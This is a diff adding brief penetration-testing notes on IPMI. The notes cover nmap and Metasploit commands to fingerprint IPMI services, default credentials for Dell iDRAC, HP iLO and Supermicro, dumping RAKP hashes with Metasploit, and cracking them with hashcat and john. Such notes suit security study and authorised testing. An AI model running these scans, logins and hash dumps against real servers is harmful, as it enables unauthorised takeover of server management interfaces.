@@ -1,0 +1,21 @@
+==> IPMI (Intelligent Platform Management Interface)
+
+sudo nmap -sU --script ipmi-version -p 623 TARGET_IP
+msf6 > use auxiliary/scanner/ipmi/ipmi_version
+
+==> Default credentials
+
+-PRODUCT	      -USERNAME	      -PASSWORD
+Dell iDRAC	      root	          calvin
+HP iLO	          Administrator   randomized 8-character string consisting of numbers and uppercase letters
+Supermicro IPMI	  ADMIN	          ADMIN
+
+-> If default creds don't work, maybe a flaw in the RAKP protocol will work (transmitted SHA1 or MD5 hash)
+
+--> In case of HP iLO with factory default password:
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u (8 character password)
+
+==> Dumping the hashes with MSF
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+
+john hash2 --wordlist=/wordlists/darkc0de.txt
